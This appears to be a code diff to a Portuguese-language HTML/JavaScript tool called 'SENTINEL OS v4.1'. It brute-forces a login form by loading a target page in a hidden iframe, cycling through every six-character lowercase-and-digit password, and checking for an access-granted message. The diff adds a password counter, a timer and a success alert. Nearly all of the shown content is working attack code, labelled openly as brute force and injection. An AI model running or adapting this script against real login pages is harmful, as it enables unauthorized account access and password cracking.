@@ -3,23 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SENTINEL OS v4.0 - ANTI-FREEZE</title>
+    <title>SENTINEL OS v4.1 - METRICS</title>
     <style>
         body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; transition: background 0.5s; }
-        .panel { width: 100%; max-width: 500px; border: 1px solid #00ff41; padding: 20px; background: #000; margin: auto; }
-        #console { height: 200px; overflow-y: auto; background: #000; border: 1px solid #113311; padding: 10px; font-size: 11px; margin-bottom: 10px; }
+        .panel { width: 100%; max-width: 500px; border: 1px solid #00ff41; padding: 20px; background: #000; margin: auto; box-shadow: 0 0 15px rgba(0,255,65,0.2); }
+        
+        /* Monitor de Métricas */
+        .metrics-bar { 
+            display: flex; 
+            justify-content: space-between; 
+            background: #111; 
+            padding: 8px; 
+            border: 1px solid #222; 
+            font-size: 11px; 
+            margin-bottom: 10px;
+            color: #00ff41;
+        }
+        .metric-val { color: #fff; font-weight: bold; }
+
+        #console { height: 180px; overflow-y: auto; background: #000; border: 1px solid #113311; padding: 10px; font-size: 11px; margin-bottom: 10px; }
         .found-screen { background: #fff !important; color: #000 !important; }
-        button { background: #00ff41; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; }
-        .status-box { font-size: 10px; margin-bottom: 10px; color: #888; }
+        button { background: #00ff41; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; }
+        button:disabled { background: #003300; color: #006600; cursor: not-allowed; }
+        .status-box { font-size: 10px; margin-bottom: 5px; color: #888; text-transform: uppercase; }
     </style>
 </head>
 <body>
 
     <div class="panel" id="mainPanel">
-        <h2>SENTINEL v4.0</h2>
-        <div class="status-box">MODO: ESTABILIDADE MÁXIMA (ANTI-TRAVAMENTO)</div>
-        <div id="console">> SISTEMA PRONTO...</div>
-        <button id="btn" onclick="iniciarAtaqueEstavel()">INICIAR QUEBRA</button>
+        <h2>SENTINEL v4.1</h2>
+        
+        <div class="metrics-bar">
+            <span>PASS: <span id="counter" class="metric-val">0</span></span>
+            <span>TIME: <span id="timer" class="metric-val">00:00</span></span>
+        </div>
+
+        <div class="status-box">STATUS: Sistema de Injeção Pronto</div>
+        <div id="console">> OPERADOR IAN FELIX AGUARDANDO...</div>
+        <button id="btn" onclick="iniciarAtaqueEstavel()">EXECUTAR BRUTE FORCE</button>
     </div>
 
     <iframe id="targetFrame" src="alvo.html" style="display:none;"></iframe>
@@ -27,11 +48,21 @@
     <script>
         const charset = "abcdefghijklmnopqrstuvwxyz0123456789";
         let encontrado = false;
+        let totalSenhas = 0;
+        let segundos = 0;
+        let intervaloTimer;
 
         async function log(m) {
             const c = document.getElementById('console');
             c.innerHTML += `<div>> ${m}</div>`;
             c.scrollTop = c.scrollHeight;
+        }
+
+        function atualizarCronometro() {
+            segundos++;
+            const mins = Math.floor(segundos / 60).toString().padStart(2, '0');
+            const segs = (segundos % 60).toString().padStart(2, '0');
+            document.getElementById('timer').innerText = `${mins}:${segs}`;
         }
 
         async function iniciarAtaqueEstavel() {
@@ -41,11 +72,18 @@
             const targetDoc = frame.contentDocument || frame.contentWindow.document;
             
             btn.disabled = true;
-            btn.innerText = "QUEBRANDO...";
-            await log("Iniciando motor estabilizado...");
+            btn.innerText = "ATAQUE EM CURSO...";
+            
+            // Inicia Cronômetro
+            intervaloTimer = setInterval(atualizarCronometro, 1000);
+            
+            await log("Motor de estabilidade ativado.");
+            await log("Iniciando injeção cíclica...");
 
-            // Função para testar uma única combinação
             const testar = (combo) => {
+                totalSenhas++;
+                document.getElementById('counter').innerText = totalSenhas.toLocaleString();
+
                 const input = targetDoc.getElementById('pass');
                 const botao = targetDoc.querySelector('button');
                 const statusAlvo = targetDoc.getElementById('status');
@@ -55,38 +93,44 @@
 
                 if (statusAlvo.innerHTML.includes("CONCEDIDO")) {
                     encontrado = true;
+                    clearInterval(intervaloTimer); // Para o tempo
                     document.body.classList.add('found-screen');
-                    alert("!!! SENHA ENCONTRADA: " + combo + " !!!");
-                    log("SUCESSO: " + combo);
+                    alert(`!!! SUCESSO !!!\nSENHA: ${combo}\nTEMPO: ${document.getElementById('timer').innerText}\nTOTAL: ${totalSenhas}`);
+                    log(`MATCH ENCONTRADO: ${combo}`);
                     return true;
                 }
                 return false;
             };
 
-            // Gerador que permite pausas (evita o travamento do Chrome)
             let c1=0, c2=0, c3=0, c4=0, c5=0, c6=0; 
             
             const rodarBloco = () => {
                 if (encontrado) return;
 
-                // Testamos um bloco de 500 combinações por vez
+                // Testamos blocos para manter a fluidez do Chrome
                 for (let i = 0; i < 500; i++) {
                     let senha = charset[c1] + charset[c2] + charset[c3] + charset[c4] + charset[c5] + charset[c6];
                     
                     if (testar(senha)) return;
 
-                    // Lógica de incremento dos 6 dígitos
                     c6++;
                     if (c6 >= charset.length) { c6 = 0; c5++; }
                     if (c5 >= charset.length) { c5 = 0; c4++; }
                     if (c4 >= charset.length) { c4 = 0; c3++; }
                     if (c3 >= charset.length) { c3 = 0; c2++; }
                     if (c2 >= charset.length) { c2 = 0; c1++; }
-                    if (c1 >= charset.length) { log("Fim das possibilidades."); return; }
+                    if (c1 >= charset.length) { 
+                        clearInterval(intervaloTimer);
+                        log("Fim das possibilidades."); 
+                        return; 
+                    }
                 }
 
-                // O SEGREDO: Aqui damos 1 milissegundo para o Chrome respirar
-                log("Testando: " + charset[c1] + charset[c2] + charset[c3] + "...");
+                // Log de status a cada bloco para não poluir a tela
+                if(totalSenhas % 5000 === 0) {
+                    log(`Status: ${totalSenhas} testes processados...`);
+                }
+                
                 setTimeout(rodarBloco, 1); 
             };
 
